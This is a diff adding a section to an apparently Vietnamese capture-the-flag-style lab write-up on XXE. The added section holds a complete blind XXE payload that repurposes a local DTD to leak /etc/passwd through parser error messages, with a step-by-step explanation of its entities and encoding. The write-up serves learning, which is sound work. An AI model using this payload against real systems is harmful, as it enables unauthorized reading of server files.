@@ -411,3 +411,27 @@ Rồi render thành ảnh cuối. Tại sao lại đọc được /etc/hostname?
 Điều cần nhớ svg là một tài liệu XML. Apache Batik: là thư viện chuyên đọc SVG, muốn đọc svg phải parse XML
 
 XXE xảy ra đúng lúc parser đọc nội dung SVG. Sau khi parser xong Apache Batik chỉ đơn giản vẽ những gì parser trả về.
+
+Lab 9: Exploiting XXE to retrieve data by repurposing a local DTD
+
+![alt text](image.png)
+
+Payload:
+```
+<!DOCTYPE message [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///tungu/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+```
+
+Payload lợi dụng Blind XXE kết hợp với local DTD để đọc nội dung /etc/passwd mà không cần server trả trực tiếp dữ liệu trong response. Đầu tiên, %local_dtd tải DTD có sẵn trên máy chủ (docbookx.dtd), sau đó payload định nghĩa %file trỏ tới /etc/passwd. %eval tạo ra %error, trong đó nội dung của %file được chèn vào một đường dẫn file:///tungu/.... Khi %error được thực thi, XML parser cố truy cập đường dẫn không tồn tại và phát sinh lỗi. Nếu thông báo lỗi được trả về ứng dụng, nội dung /etc/passwd có thể bị lộ thông qua đường dẫn trong lỗi. Các chuỗi như &#x25;, &#x26;, &#x27; được sử dụng để encode %, &, ', giúp trì hoãn việc phân tích các entity qua nhiều lớp.
+
+![alt text](image-1.png)
+![alt text](image-2.png)
+
